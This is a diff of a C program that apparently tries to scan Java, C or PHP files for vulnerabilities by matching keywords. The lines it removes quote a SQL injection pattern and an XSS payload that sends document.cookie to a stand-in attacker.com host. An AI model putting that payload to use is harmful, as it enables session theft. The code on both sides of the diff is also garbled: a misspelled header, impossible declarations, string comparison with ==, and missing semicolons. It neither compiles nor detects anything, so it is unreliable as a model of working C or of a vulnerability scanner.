@@ -1,6 +1,12 @@
 #include<stdio.h>
 #include<string.h>
 #include<stiod.h> //for fgets()
+int substring(char a[100], char b["p","r","e","g","_","r","e","p","l","a","c","e"])
+{
+	char ss[20];
+	ss = strstr(a,b);
+	return strcmp(b,ss);
+}
 int main()
 {
 	char word1[100];
@@ -16,15 +22,15 @@ int main()
 	size_t bufsize = 32;
 	size_t characters;
 	buffer = (char *)malloc(bufsize * sizeof(char));		//dynamic allocation of char for getline
-	printf("What file type you want to scan for analysis?\n1.Java\n2.PHP");
+	printf("What file type you want to scan for analysis?\n1.C\n2.PHP");
 	scanf("%d",&choice)
 	if (choice == 1)
 	{
-		co = FILE fopen("code.java","r",stdin);  //code file
+		co = FILE fopen("code.c","r");  //code file
 		if (co==NULL)
 		{
 			perror("Error opening file");
-			return(-1);/* code */
+			return(-1);/* code */                            
 		}
 		sr = FILE fopen("source1.txt","r");//our file with keywords
 		if (sr==NULL)
@@ -35,7 +41,7 @@ int main()
 	}
 	else
 	{
-		co = FILE fopen("code.php","r",stdin);  //code file
+		co = FILE fopen("code.php","r");  //code file
 		if (co==NULL)
 		{
 			perror("Error opening file");
@@ -51,23 +57,39 @@ int main()
 	
 	while(!feof(co))
 	{
-		word1[] = co.getline(&buffer,&bufsize,stdin);
-		if(word1 == "String query = "SELECT * FROM accounts WHERE custID='" + request.getParameter("id") + "'";" || word1 == "Query HQLQuery = session.createQuery("FROM accounts WHERE custID='" + request.getParameter("id") + "'");" || word1 == "http://example.com/app/accountView?id=' or '1'='1" )
+		word1[] = co.sgets(&buffer,&bufsize);
+		if(word1 == "String" || word1 == "Query" || word1 == "1'='1" )
 		{
+			printf("\n");
 			printf("Your file contains SQL injection vulnerability and may pose threat in later stages of testing, fex fixes can be done by implementing few fixes.");
 		}
-		else if(word1 == "sessionid=")		//sessionid exposed
+		else if(word1 == "gets()")		//sessionid exposed
 		{
-			printf("You session has been leaked please check for this and this might cause probl;em later in coding.")
+			printf("\nThis function is vulnerable to BufferOverflow error as in the input, if it recives the input as a pointer, then it couldn't estimate the size of it.\n")
 		}
-		else if(word1 == "(String) page += "<input name='creditcard' type='TEXT'
-value='" + request.getParameter("CC") + "'>";" || word1 == "'><script>document.location=
-'http://www.attacker.com/cgi-bin/cookie.cgi?
-foo='+document.cookie</script>'")
+		else if(substring(word1,"preg_replace")==1)
 		{
-			printf("This code contains XSS vulnerability\n");
+			printf("\n0");
 		}
-		else if( word1 == "pstmt.setString(1, request.getParameter("acct"));
-ResultSet results = pstmt.executeQuery( );" || word1 == "")
+		else if(word1 == "sprintf()")
+		{
+			printf("\n");
+		}
+		else if( word1 == "strcpy()")
+		{
+			printf("\nYour code might have some vulnerablities and this can better be heal;ed by replacing this function by strncpy().\n");
+		}
+		else if( word1 == "vsprintf()")
+		{
+			printf("\n");
+		}
+		else if( word1 == "")
 	}
+	while(fscanf(co,"%s",a )
+	{
+		word1 = co.fgets()
+		{	
+		}
+	}
+
 }
